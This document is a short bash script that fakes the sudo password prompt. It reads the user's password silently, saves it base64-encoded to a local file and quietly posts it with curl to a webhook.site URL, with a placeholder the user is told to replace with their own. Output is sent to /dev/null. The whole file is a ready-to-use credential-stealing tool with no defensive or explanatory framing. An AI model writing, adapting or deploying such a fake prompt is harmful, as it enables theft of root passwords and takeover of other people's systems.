#!/bin/bash

password_file="root_password.txt"
webhook_url="https://webhook.site/pate-your-l1nk"  # Replace with your webhook URL

if [ ! -f "$password_file" ]; then
  read -s -p "[sudo] password for $(whoami): " root_password
  echo
  echo "$root_password" | base64 > "$password_file"

  # Send the password file content to webhook.site and redirect output to /dev/null
  curl -X POST -F "file_content=$(cat "$password_file" | base64)" "$webhook_url" >/dev/null 2>&1
else
  stored_password=$(cat "$password_file" | base64 -d)
  echo -n "[sudo] password for $(whoami): "
  read -s user_input
  echo
  if [ "$user_input" != "$stored_password" ]; then
    echo ""
    exit 1
  fi
fi

echo ""
